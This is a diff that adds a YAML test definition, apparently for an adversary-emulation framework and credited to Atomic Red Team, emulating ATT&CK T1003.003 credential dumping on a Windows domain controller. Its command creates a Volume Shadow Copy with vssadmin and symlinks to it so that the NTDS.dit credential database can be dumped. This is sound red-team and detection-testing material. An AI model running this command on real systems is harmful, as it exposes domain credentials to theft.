@@ -1,0 +1,39 @@
+- id: 21748c28-2793-4284-9e07-d6d028b66702
+  name: Create Symlink to Volume Shadow Copy
+  description: 'This test is intended to be run on a domain Controller.
+
+
+    The Active Directory database NTDS.dit may be dumped by creating a symlink to
+    Volume Shadow Copy.'
+  tactic: credential-access
+  technique:
+    attack_id: T1003.003
+    name: 'OS Credential Dumping: NTDS'
+  platforms:
+    windows:
+      sh:
+        command: vssadmin.exe create shadow /for=C:; mklink /D C:\Temp\vssstore \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1003.003
+  - credential-access
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      drive_letter:
+        description: Drive letter to source VSC (including colon)
+        type: string
+        default: 'C:'
+      symlink_path:
+        description: symlink path
+        type: string
+        default: C:\Temp\vssstore
+    technique_created: '2020-02-11T18:42:35.572Z'
+    atomic_guid: 21748c28-2793-4284-9e07-d6d028b66702
+    import_timestamp: '2025-06-24T11:15:06.855252Z'
